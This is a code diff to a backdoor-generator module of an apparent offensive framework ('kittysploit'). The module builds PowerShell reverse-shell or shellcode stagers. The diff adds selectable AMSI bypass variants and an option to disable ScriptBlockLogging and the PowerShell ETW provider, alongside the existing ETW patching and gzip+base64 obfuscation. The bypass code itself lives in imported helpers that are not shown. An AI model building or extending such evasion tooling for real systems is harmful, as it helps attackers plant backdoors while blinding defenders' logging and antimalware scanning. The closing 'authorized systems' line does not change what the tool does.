@@ -9,6 +9,7 @@ gzip wrapper, and either a built-in reverse shell or shellcode stager mode.
 """
 
 from kittysploit import *
+from lib.c2.stager_evasion import AMSI_VARIANTS, DEFAULT_AMSI_VARIANT
 from lib.compile.backdoor_helpers import generate_payload_bytes, option_value, report_payload_size
 from lib.compile.powershell_stager import build_powershell_stager
 
@@ -26,6 +27,7 @@ class Module(Backdoor):
         "listener": "listeners/multi/reverse_tcp",
         "references": [
             "https://github.com/tihanyin/PSSW100AVB",
+            "https://redteamrecipes.com/blog/2025/11/Evasion/",
         ],
     }
 
@@ -43,7 +45,18 @@ class Module(Backdoor):
         False,
     )
     encoder = OptString("", "Encoder module path (shellcode_stager mode, optional)", False)
-    bypass_amsi = OptBool(True, "Prepend AMSI init-failed bypass", False)
+    bypass_amsi = OptBool(True, "Prepend AMSI bypass prelude", False)
+    amsi_variant = OptChoice(
+        DEFAULT_AMSI_VARIANT,
+        "AMSI bypass variant when bypass_amsi is true",
+        False,
+        list(AMSI_VARIANTS.keys()),
+    )
+    bypass_scriptblock = OptBool(
+        False,
+        "Also neuter ScriptBlockLogging GPO cache + PS ETW provider",
+        False,
+    )
     patch_etw = OptBool(False, "Patch EtwEventWrite in-process before stager body", False)
     gzip_encode = OptBool(False, "Wrap final script in gzip+base64 one-liner", False)
     output_name = OptString("", "Output filename (.ps1); random if empty", False)
@@ -67,6 +80,8 @@ class Module(Backdoor):
                 lport=int(option_value(self, "lport") or 4444),
                 bypass_amsi=bool(option_value(self, "bypass_amsi")),
                 patch_etw=bool(option_value(self, "patch_etw")),
+                amsi_variant=str(option_value(self, "amsi_variant") or DEFAULT_AMSI_VARIANT),
+                bypass_scriptblock=bool(option_value(self, "bypass_scriptblock")),
                 mode=mode,
                 shellcode=shellcode,
                 gzip_encode=bool(option_value(self, "gzip_encode")),
@@ -84,8 +99,9 @@ class Module(Backdoor):
         self.write_out_dir(filename, script)
         print_success(f"Generated: {filename}")
         print_info(
-            f"Mode: {mode} | AMSI bypass: {option_value(self, 'bypass_amsi')} | "
-            f"ETW patch: {option_value(self, 'patch_etw')} | Gzip: {option_value(self, 'gzip_encode')}"
+            f"Mode: {mode} | AMSI: {option_value(self, 'bypass_amsi')} "
+            f"({option_value(self, 'amsi_variant')}) | "
+            f"ETW: {option_value(self, 'patch_etw')} | Gzip: {option_value(self, 'gzip_encode')}"
         )
         print_warning("Use only on authorized systems.")
         return True
